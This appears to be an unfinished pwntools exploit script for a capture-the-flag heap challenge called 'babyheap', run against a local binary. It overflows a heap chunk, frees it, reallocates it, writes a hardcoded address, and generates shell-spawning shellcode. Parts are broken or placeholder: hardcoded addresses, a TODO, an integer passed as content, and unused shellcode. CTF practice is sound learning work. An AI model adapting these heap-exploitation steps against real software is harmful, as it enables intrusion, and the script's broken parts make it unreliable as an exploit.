#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./babyheap
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./babyheap')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

index1 = 0
index2 = 1
size1 = 42
size2 = 14
payload1 = "A" * size1
payload2 = 0x555555757268 # address of filled after freed

offset = 0x555555554000 # TODO this value is dynamic. must be obtained programmatically
plt_addr = 0x00000000000009a0
puts_addr = 0x201f70 # relative address

io = start()

def allocate(size):
    io.recvuntil("Command: ")
    io.sendline("1")
    io.recvuntil("Size:")
    io.sendline(str(size))
    result = io.recvline()
    index = int(result.split(" ")[3])
    return index

def fill(index, size, content):
    io.recvuntil("Command: ")
    io.sendline("2")
    io.recvuntil("Index:")
    io.sendline(str(index))
    io.recvuntil("Size:")
    io.sendline(str(size))
    io.recvuntil("Content:")
    io.sendline(content)


def free(index): 
    io.recvuntil("Command:")
    io.sendline("3")
    io.recvuntil("Index:")
    io.sendline(str(index))

print("allocating 8 bytes...")
index1 = allocate(8)
print("allocated index is {}".format(index1))
print("filling index {} with {}".format(index1, payload1))
fill(index1, size1, payload1)
print("freeing index {}".format(index1))
free(index1)
print("allocating...size {}".format(size2))
index2 = allocate(size2)
print("allocated index is {}".format(index2))
print("filling index {}, size {}, payload {}".format(index2, size2, payload2))
fill(index2, size2, payload2)

shellcode = asm(shellcraft.sh())
print(shellcode)
# 2. Fill
# 4. Dump
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

